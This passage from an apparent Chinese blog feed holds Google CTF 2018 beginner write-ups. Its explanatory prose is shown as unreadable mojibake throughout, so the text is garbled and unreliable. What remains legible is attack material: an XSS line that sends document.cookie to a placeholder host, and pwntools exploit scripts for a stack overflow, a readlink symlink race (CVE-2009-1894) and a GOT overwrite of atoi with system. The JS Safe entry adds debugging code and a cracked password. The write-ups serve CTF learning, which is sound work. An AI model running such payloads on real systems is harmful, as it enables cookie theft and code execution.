Image();</span><br><span class="line">img.src = <span class="string">"http://xxxxxx/?c="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>è¿™æ ·åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨çš„æ—¥å¿—ä¸­å°±å¯ä»¥çœ‹åˆ°å¸¦æœ‰cookieçš„è¯·æ±‚äº†ã€‚ä½†æ˜¯ç”±äºæ¯”èµ›å·²ç»ç»“æŸï¼Œä¼°è®¡æœºå™¨äººä¹Ÿæ²¡äº†ï¼Œæ‰€ä»¥åªèƒ½ç›´æ¥æŠ„wpä¸­çš„cookieè¿›å…¥åå°ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/11.png"><p>æ·»åŠ cookieä¹‹åï¼Œé‡æ–°ç™»å½•å°±ä¼šè¿›å…¥æ§åˆ¶é¡µé¢äº†</p><img src="/2018/07/18/google-ctf-beginner-part1/12.png"><p>æœ€ååœ¨ç½‘é¡µä¸­æ‰¾åˆ°flag</p><p>åœ¨XSSçš„æ„é€ ä¸­åˆ©ç”¨//æ¥åŒ…å«é“¾æ¥æ¯”è¾ƒæœ‰æ„æ€ï¼Œå…¶ä»–çš„å°±æ˜¯ä¸­è§„ä¸­çŸ©çš„CSRF+XSSçš„è¿é”ã€‚</p><h2 id="Message-of-the-day-PWN"><a href="#Message-of-the-day-PWN" class="headerlink" title="Message of the day(PWN)"></a>Message of the day(PWN)</h2><p>å…ˆæŒ‰ç…§å›½é™…æƒ¯ä¾‹æ£€æŸ¥ä¸€ä¸‹ç¨‹åºçš„å®‰å…¨ä¿æŠ¤ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/13.png"><p>å¼€å¯äº†NXæ„å‘³ç€æ— æ³•åœ¨å†…å­˜ä¸­æ— æ³•æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ²¡æœ‰åŠæ³•å†™shellcodeæ‰§è¡Œæ‹¿æƒé™ã€‚åˆ†æä¹‹åå‘ç°è¾“å…¥ç‚¹å¤„æœ‰ä¸å®‰å…¨çš„getså‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯å¯ä»¥æ ˆæº¢å‡ºçš„ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/14.png"><p>ä½†æ˜¯ï¼Œæ²¡æœ‰åŠæ³•å†™shellcodeï¼Œé‚£ä¹ˆè¿˜æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥æ‹¿åˆ°flagå‘¢ï¼Œåœ¨åˆ†æç¨‹åºæ—¶çœ‹åˆ°åœ¨é€‰é¡¹4ä¸­ä¼šæœ‰è¯»å–flagçš„æ“ä½œï¼Œå¿…é¡»æ˜¯ç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œã€‚</p><p>æ—¢ç„¶æ— æ³•å†™shellcodeï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦†ç›–è¿”å›åœ°å€ç”¨ret2libcçš„æ€è·¯å»æ‹¿flagï¼Œåº”è¯¥æ˜¯è¡Œçš„ï¼Œæˆ‘ä»¬çŸ¥é“è¯»å–flagçš„å‡½æ•°åœ°å€ï¼Œåªè¦æŠŠè¿”å›åœ°å€è¦†ç›–æˆè¿™ä¸ªåœ°å€å³å¯ã€‚</p><p>srcæ˜¯ä¸€ä¸ª0x100çš„æ ˆï¼Œè¦æ ˆæº¢å‡ºçš„è¯å°±è¦padding A*(0x100 + SPå¯„å­˜å™¨çš„å¤§å°)</p><img src="/2018/07/18/google-ctf-beginner-part1/15.png"><p>å‘ç°æ˜¯RSP64ä½å¯„å­˜å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ€åçš„paddingå°±æ˜¯ A*(0x100+8)ï¼Œåœ°å€æˆ‘ä»¬ä¹ŸæŸ¥åˆ°äº†æ˜¯ 00000000606063A5ï¼Œæ‰€ä»¥æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"motd.competition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x108</span> + <span class="string">"\xA5\x63\x60\x60\x00\x00\x00\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹ï¼Œæ‹¿åˆ°flag</p><img src="/2018/07/18/google-ctf-beginner-part1/16.png"><h2 id="Poetry-PWN"><a href="#Poetry-PWN" class="headerlink" title="Poetry(PWN)"></a>Poetry(PWN)</h2><p>æœ‰è¶£çš„ä¸€é“é¢˜ï¼Œå¼€å¯äº†æ ˆä¿æŠ¤ï¼Œæ‰€ä»¥æ ˆæº¢å‡ºæ˜¯ä¸å­˜åœ¨äº†ã€‚é‚£ä¹ˆçœ‹çœ‹IDAä¸­çš„å†…å®¹ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/17.png"><p>å…¶ä¸­çš„LD_BIND_NOW åœ¨ç½‘ä¸ŠæŸ¥å‡ºæ¥çš„ç»“æœï¼Œå½“è¿™ä¸ªå˜é‡è®¾ç½®ä¸º1çš„æ—¶å€™ï¼Œä¼šè®©è¿æ¥å™¨åœ¨ç¨‹åºæ‰§è¡Œå‰æŠŠæ‰€æœ‰çš„å‡½æ•°åœ°å€éƒ½è¿æ¥å¥½ã€‚</p><p>ç„¶åä¼šç”¨readlinkè¯»å– /proc/self/exe å°±å¯ä»¥è·å–å½“å‰ç¨‹åºçš„ç»å¯¹è·¯å¾„ï¼Œä¹‹åè®¾ç½® LD_BIND_NOWä¸º1ï¼Œå†æ¬¡æ‰§è¡Œè¯¥ç¨‹åºã€‚</p><p>è¿™é‡Œæœ‰ä¸ªtrickï¼Œå°±æ˜¯å¦‚æœåœ¨ç¨‹åºæ‰§è¡Œreadlink(/proc/self/exe )çš„æ—¶å€™æ”¹å˜æºç¨‹åºï¼Œé‚£ä¹ˆreadlinkå¾—åˆ°çš„å†…å®¹å°±ä¼šå˜æˆ åŸè·¯å¾„+â€ (deleted)â€</p><p>æ‰€ä»¥åªè¦æˆ‘ä»¬åœ¨ç¨‹åºè¿è¡Œæ—¶å¯¹å®ƒåšæ”¹åŠ¨ï¼Œå®ƒçš„readlinkå°±ä¼šæ˜¯å¦å¤–ä¸€ä¸ªåç§°ï¼Œç„¶ååˆ©ç”¨æ–°çš„åç§°æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ã€‚</p><p>ç”±äºæˆ‘ä»¬çš„flagåœ¨å…¶ä»–ç”¨æˆ·çš„ç›®å½•ä¸­ï¼Œæˆ‘ä»¬æ— æ³•è¯»å–ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯æ”¹åŠ¨ç¨‹åºè®©å®ƒæ‰§è¡Œæˆ‘ä»¬æ§åˆ¶å¥½çš„å…¶ä»–ç¨‹åºè¯»å–flagï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰æƒé™çš„ï¼Œä½†æ˜¯poetryæœ‰è¿™ä¸ªæƒé™ã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬å…ˆç”¨lné“¾æ¥ poetryï¼Œå¾—åˆ°ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„poetryï¼Œéšåln -s ç¡¬é“¾æ¥cat å‘½åä¸º poetry(deleted)ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨æ‰§è¡Œæˆ‘ä»¬é“¾æ¥çš„poetry flagï¼Œç„¶ååˆ é™¤æˆ‘ä»¬çš„é“¾æ¥ç¨‹åºï¼Œå°±ä¼šè§¦å‘cat è¯»å–flagï¼Œæ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯poetryç”¨æˆ·çš„æƒé™ï¼Œæ‰€ä»¥æ²¡é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"poetry.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"ln -s /bin/cat '/home/user/poetry (deleted)'\n"</span>)</span><br><span class="line">r.send(<span class="string">"ln /home/poetry/poetry /home/user/poetry\n"</span>)</span><br><span class="line">r.send(<span class="string">"(/home/user/poetry /home/poetry/flag &amp;);rm /home/user/poetry\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>æœ€åè¿™ä¸ªè„šæœ¬è¦å¤šè·‘å‡ æ¬¡ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯æ¡ä»¶ç«äº‰çš„æ¼æ´ï¼Œæœ€åé€šè¿‡è¿™ä¸ªflagäº†è§£åˆ°CVE-2009-1894ï¼Œè¿™ä¸ªæ´çš„è§¦å‘æ¡ä»¶å°±æ˜¯åœ¨æˆ‘ä»¬æ‰§è¡Œç¨‹åºçš„æ—¶å€™ï¼Œæ­£å¥½åˆ é™¤äº†åŸå§‹é“¾æ¥ç¨‹åºï¼Œç„¶åä½¿å¾—readlinkè¿”å›æˆ‘ä»¬ä¼ªé€ çš„ç¨‹åºè·¯å¾„ä»è€Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/18.png"><p>æ‹¿åˆ°flag CVEé“¾æ¥ <code>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894</code></p><h2 id="Fridge-ToDo-List-PWN"><a href="#Fridge-ToDo-List-PWN" class="headerlink" title="Fridge ToDo List(PWN)"></a>Fridge ToDo List(PWN)</h2><p>å¼€å¯äº†PIEï¼Œæ— æ³•åœ¨å†…å­˜ä¸­ç¡®å®šå…·ä½“çš„åœ°å€äº†ã€‚ç°åœ¨å…ˆçœ‹çœ‹ç¨‹åºæœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Œ1-6ä¸ªé€‰é¡¹ã€‚</p><ol><li>æ‰“å°åˆ—è¡¨</li><li>æ‰“å°ToDoçš„ä»»åŠ¡</li><li>å­˜å‚¨ToDoä»»åŠ¡</li><li>åˆ é™¤ToDoä»»åŠ¡</li><li>è¿œç¨‹ç®¡ç†å‘˜</li><li>é€€å‡º</li></ol><p>é¦–å…ˆç¬¬ä¸€ä¸ªé€‰é¡¹ï¼Œå°±ä»…ä»…æ˜¯æ‰“å°ï¼Œæ²¡ä»€ä¹ˆè¾“å…¥ï¼Œæ”¾å¼ƒã€‚</p><p>ç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªç¬¬å››ä¸ªä¼šæœ‰ç¼–å·è¾“å…¥ï¼Œç¬¬äºŒä¸ªæœ‰è¯»æ“ä½œï¼Œç¬¬ä¸‰ä¸ªæœ‰å†™æ“ä½œï¼Œæ‰€ä»¥é‡ç‚¹å°±æ˜¯è¿™ä¸¤ä¸ªã€‚</p><p>ç¬¬äº”ä¸ªæŸ¥çœ‹æºç å°±çŸ¥é“åªæ˜¯ä¸€ä¸ªå¹Œå­ã€‚</p><p>ç¬¬å…­ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼Œé€€å‡ºæ“ä½œã€‚</p><p>çœ‹åˆ°ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæ“ä½œä¸­éƒ½æœ‰åŒæ ·çš„ä»£ç </p><img src="/2018/07/18/google-ctf-beginner-part1/19.png"><p>è¿™é‡Œåªæ£€æŸ¥äº†æ˜¯å¦å¤§äºæœ€å¤§æ•°é‡ï¼Œå¹¶æ²¡æœ‰é™åˆ¶æ˜¯å¦å°äº0,ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¶Šç•Œè¯»å’Œå†™ã€‚</p><p>é€šè¿‡IDAæˆ‘ä»¬åˆ†æçœ‹åˆ° todoä»0x203140å¼€å§‹ï¼Œé—´éš”ä¸º0x30ï¼Œé‚£ä¹ˆå¾€ä¸Šé¢çœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥è¯»å†™çš„ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/20.png"><p>ä¸é”™ï¼Œåœ¨.got.pltéƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–åˆ°è¿™ä¸‰ä¸ªå‡½æ•°çš„åœ°å€ï¼Œæ³„éœ²äº†å‡½æ•°åœ°å€ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥å¾—åˆ°libcçš„ä¿¡æ¯ã€‚</p><p>ä¹‹åè¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°atoiæ˜¯æ¯æ¬¡æˆ‘ä»¬è¾“å…¥ç¼–å·éƒ½ä¼šè°ƒç”¨çš„å‡½æ•°ï¼Œatoiè€Œä¸”è¿˜åœ¨opençš„é™„è¿‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠatoiè¦†ç›–æˆsystemæ‰§è¡Œæˆ‘ä»¬çš„ä»»æ„å‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚æ‰€ä»¥å‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œæ‰§è¡Œå†™æ“ä½œï¼Œé€šè¿‡ä¹‹å‰æ³„éœ²çš„libcå¾—åˆ°systemçš„åœ°å€ï¼Œè¦†ç›–atoiçš„åœ°å€ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span>+pack(<span class="string">"&lt;Q"</span>,system_addr)+<span class="string">"\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹ç”¨æˆ·</p><img src="/2018/07/18/google-ctf-beginner-part1/21.png"><p>å¾—åˆ°ç”¨æˆ·åï¼Œéšåncè¿ä¸Šå»ï¼Œç›´æ¥ç”¨è¯¥ç”¨æˆ·ç™»å½•</p><img src="/2018/07/18/google-ctf-beginner-part1/22.png"><p>å¾—åˆ°flag</p><p>è¿™é‡Œè¦åæ§½ä¸€ç‚¹çš„æ˜¯ï¼Œè¿™ä¸ªæ³„éœ²çš„libcä¸€ç›´æ²¡æ‰¾åˆ°â€¦â€¦ï¼Œæ‰€ä»¥ç›´æ¥å¥—ç”¨çš„å…¶ä»–äººçš„expã€‚ç¬¬ä¸€æ¬¡æ„Ÿè§‰PWNä¹Ÿæ˜¯è›®å‘çš„ã€‚ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¼šé™†é™†ç»­ç»­çš„æŠŠGoogleCTFé¢˜ç›®çš„ç›¸å…³å¤ç°æ•´ç†å‡ºæ¥ï¼Œè¿™é‡Œå…ˆæ”¾ä¸€éƒ¨åˆ†ã€‚é€šè¿‡è¿™æ¬¡Beginnerè®­ç»ƒè¿˜æ˜¯äº†è§£åˆ°äº†è®¸å¤šä¹‹å‰æ²¡æ¥è§¦è¿‡çš„ï¼Œæ¯”å¦‚PWNé¢˜ä¸­çš„libcåœ°å€é—®é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;LETTER-MISC&quot;&gt;&lt;a href=&quot;#LETTER-MISC&quot; class
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner JS Safe 1 å¤ç°</title>
    <link href="https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/"/>
    <id>https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/</id>
    <published>2018-07-08T15:58:48.000Z</published>
    <updated>2018-07-19T01:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«çœ‹äº†çœ‹GoogleCTFçš„beginneré¢˜ç›®ï¼Œæ„Ÿè§‰æœ‰äº›é¢˜ç›®è¿˜ä¸é”™ï¼Œè¿™é‡Œå°±å…ˆåˆ†æå…¶ä¸­ä¸€é“é¢˜JS Safeã€‚</p><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><img src="/2018/07/08/google-ctf-beginner-js-safe-1/0.png"><h2 id="åˆ†æä¸æ“ä½œ"><a href="#åˆ†æä¸æ“ä½œ" class="headerlink" title="åˆ†æä¸æ“ä½œ"></a>åˆ†æä¸æ“ä½œ</h2><p>è¿™é“é¢˜æœ‰ç‚¹highï¼Œä½œä¸ºä¸€ä¸ªJSè°ƒè¯•æ–°æ‰‹ï¼Œç€å®çˆ½äº†ä¸€æŠŠã€‚é¢˜ç›®ç»™äº†ä¸€ä¸ªHtmlç½‘é¡µï¼Œé‡Œé¢æœ‰ä¸¤æ®µJSä»£ç ï¼Œçœ‹æ¥æ˜¯JSä»£ç åˆ†æçš„é¢˜ç›®ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/1.png"><p>æˆ‘ä»¬å…ˆçœ‹å…¶ä¸­çš„ä¸€æ®µï¼Œå‰ä¸¤ä¸ªæ˜¯è§£å¯†ç”¨çš„å‚æ•°ï¼Œçœ‹åˆ°open_safeè¿™ä¸ªå‡½æ•°ï¼Œpasswordå¿…é¡»æ˜¯CTF{xxxx}çš„æ ¼å¼ï¼Œè¯»å–å…¶ä¸­çš„æ•°æ®ä»£å…¥åˆ¤æ–­ã€‚<br>ifä¸­æŠŠæˆ‘ä»¬çš„è¾“å…¥ä»£å…¥äº†xå‡½æ•°ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/2.png"><p>æˆ‘ä»¬çš„passwordä¼šåœ¨envçš„gå‚æ•°ä¸­è¢«ç¼–ç ï¼Œaæ˜¯è¯»æ•°ç»„æ•°æ®ï¼Œbæ˜¯åˆ›å»ºå‡½æ•°ï¼Œcæ˜¯åŠ æ“ä½œï¼Œdæ˜¯asciiç è½¬æ¢ã€‚</p><p>ä¹‹åï¼Œæ ¹æ®codeä¸­çš„å­—æ¯åœ¨envä¸­æ“ä½œå±æ€§ã€‚æœ€åæœ‰ä¸ªç­‰å¾…å€¼æ›´æ–°çš„å¼‚æ­¥æ“ä½œã€‚<br>å…¶ä¸­é‡ç‚¹å°±æ˜¯é‚£ä¸ªforå¾ªç¯å¯¹envçš„æ“ä½œï¼Œä½†æ˜¯ä»£ç è¿™ä¸ªåˆå¾ˆéš¾çœ‹æ‡‚â€¦â€¦ æ‰€ä»¥åªèƒ½ç”¨console.logæ¥dumpå‡ºæ¥çœ‹çœ‹ç»†èŠ‚ã€‚è€Œæˆ‘ä»¬æƒ³çŸ¥é“æˆ‘ä»¬çš„passwordè¢«ç”¨æ¥å¹²ä»€ä¹ˆäº†ã€‚</p><p>åœ¨forå¾ªç¯ä¸­åŠ ä¸Šä¸€äº›ä»£ç æ¥é”å®šgå‚æ•°çš„ä½ç½®ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="regexp">/g/</span>.test(code.substr(i,<span class="number">4</span>)))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="built_in">console</span>.log(code.substr(i,<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2018/07/08/google-ctf-beginner-js-safe-1/3.png"><p>å®šä½åœ¨äº†876å‡ºç°äº†gï¼Œç„¶åçœ‹envé‡Œé¢æœ‰äº›å•¥ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/4.png"><p>æœ‰è¶£çš„ä¸œè¥¿ï¼Œå‡ºç°äº†ä¹‹å‰jsä»£ç ä¸­çš„subtleï¼Œdigstï¼Œsha-256ï¼Œè€Œä¸”åœ¨æœ€åçš„æ•°ç»„ä¸­æ˜¯sha-256å’Œæˆ‘ä»¬çš„è¾“å…¥ç¼–ç ï¼Œè¿™å…¶å®å°±å¯ä»¥æ¨æµ‹è¿™é‡Œæ˜¯è¦å¯¹æˆ‘ä»¬çš„è¾“å…¥è®¡ç®—sha-256hashã€‚ä¸ºäº†çœ‹æ›´å¤šç»†èŠ‚ï¼Œæˆ‘ä»¬ç»§ç»­åŠ å…¥ä¸€äº›ä»£ç è°ƒè¯•ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i&gt;=<span class="number">876</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + fn + <span class="string">"("</span> + arg1 + <span class="string">":"</span> +env[arg1] + <span class="string">","</span> + arg2 + <span class="string">":"</span> +env[arg2] + <span class="string">")"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + env[fn] + <span class="string">"("</span> + env[arg1] + <span class="string">","</span> + env[arg2] + <span class="string">")"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">980</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹è¿™ä¹‹é—´æœ‰ä»€ä¹ˆæ“ä½œ</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/5.png"><p>æœä¸å…¶ç„¶ï¼Œåœ¨876-884ä¸­å®Œæˆäº†å¯¹æˆ‘ä»¬è¾“å…¥çš„hashè®¡ç®—ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/6.png"><p>åœ¨940å¤„ï¼ŒæŠŠæˆ‘ä»¬è®¡ç®—å‡ºçš„hashå˜æˆæ•°ç»„ï¼Œå­˜å…¥<code>env[Ñ¾]</code>ä¸­ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/7.png"><p>å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ï¼Œåœ¨960å–å‡ºäº†æˆ‘ä»¬hashè¿‡åçš„ç¬¬ä¸€ä¸ªå€¼ï¼Œç„¶åä¸230å¼‚æˆ–ï¼Œå¼‚æˆ–åçš„å€¼ä¸hè¿›è¡Œoræ“ä½œåèµ‹å€¼ç»™hï¼Œéšåå¼€å§‹ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚</p><p>ä»ä¹‹å‰çš„jsä»£ç ä¸­çš„ifå°±å¯ä»¥çŸ¥é“hå¿…é¡»ä¸º0æ‰èƒ½è·³è¿‡åˆ¤æ–­ã€‚æ‰€ä»¥å¼‚æˆ–çš„å€¼å¿…é¡»ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»è¦å’Œå¯¹åº”çš„å€¼ç›¸åŒã€‚è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸²hashè®¡ç®—åçš„æ•°ç»„ <code>230,104,96,84,111,24,205,187,205,134,179,94,24,181,37,191,252,103,247,114,198,80,206,223,227,255,122,0,38,250,29,238</code></p><p>æœ€ç»ˆæˆ‘ä»¬æŠŠè¿™ä¸²å­—ç¬¦è½¬16è¿›åˆ¶æ‹¼æ¥å¾—åˆ° <code>e66860546f18cdbbcd86b35e18b525bffc67f772c650cedfe3ff7a0026fa1dee</code></p><p>è¿™ä¸ªæ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦çš„hashå€¼ï¼Œæ‰¾ä¸ªhashå€¼ç ´è§£ç½‘ç«™ï¼Œå¾—åˆ° Passw0rd! ï¼Œæ‰€ä»¥æœ€ç»ˆflagä¸º<code>CTF{Passw0rd!}</code></p><p>è‡³äºå‰©ä¸‹çš„ä»£ç ï¼Œå®ƒæ˜¯ç”¨äºè§£å¯†æ•°æ®çš„ï¼Œæˆ‘ä»¬è¾“å…¥æ­£ç¡®å°±ä¼šè§£å¯†æˆåŠŸï¼Œè¾“å‡ºæ˜¯ä¸‹ä¸€é¢˜çš„å…¥å£ã€‚æ„Ÿè§‰æ˜¯ä¸€é“é¢˜è¢«æ‹†åˆ†æˆäº†å‡ å—â€¦â€¦</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¸€é“æ¯”è¾ƒåŸºç¡€ä½†æ˜¯åˆå¾ˆè€ƒå¯ŸåŸºæœ¬åŠŸçš„é¢˜ï¼Œä»ä¸­å­¦ä¹ åˆ°äº†å¾ˆå¤šã€‚</p><p>æœ€åæˆ‘æƒ³è¯´ä¸€ä¸‹çš„æ˜¯é‚£ä¸ªSubtleCrypto.digest()æ–¹æ³•æˆ‘ä¸€å¼€å§‹æ²¡æ€ä¹ˆææ‡‚ï¼Œä»–æ˜¯æ€ä¹ˆæŠŠutf-8çš„ç¼–ç æ•°ç»„hashè®¡ç®—çš„ã€‚ä¹‹åæ‰¾åˆ°äº†å®ƒçš„å®ç°åŸç†ï¼Œæ‰€ä»¥ä¹Ÿå°±æ‡‚äº†ï¼Œä¸ºä»€ä¹ˆè¦ä¸€å¼€å§‹å…ˆutf-8ç¼–ç æ‰è¿›è¡Œhashè®¡ç®—ã€‚</p><p><code>https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest</code></p><p>ç»è¿‡è¿™æ¬¡JSåˆ†æï¼Œæ„Ÿè§‰å­¦ä¹ ä¸“é—¨çš„JSè°ƒè¯•è¿«åœ¨çœ‰ç«â€¦â€¦ ï¼Œæœ‰å˜é‡ç›‘å¬å’Œäº‹ä»¶ç›‘å¬ï¼Œä¼šç»™è°ƒè¯•å·¥ä½œå¸¦æ¥å¾ˆå¤§ä¾¿åˆ©ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/JS%20safe</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å‘¨æœ«çœ‹äº†çœ‹GoogleCTFçš„beginneré¢˜ç›®ï¼Œæ„Ÿè§‰æœ‰äº›é¢˜ç›®è¿˜ä¸é”™ï¼Œè¿™é‡Œå°±å…ˆåˆ†æå…¶ä¸­ä¸€é“é¢˜JS Safeã€‚&lt;/p&gt;
&lt;h2 id=&quot;é¢˜ç›®&quot;&gt;&lt;a href=&quot;#é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®&quot;&gt;&lt;/a&gt;é¢˜ç›®&lt;/h2&gt;&lt;img src=&quot;
      
    
    </summary>
    
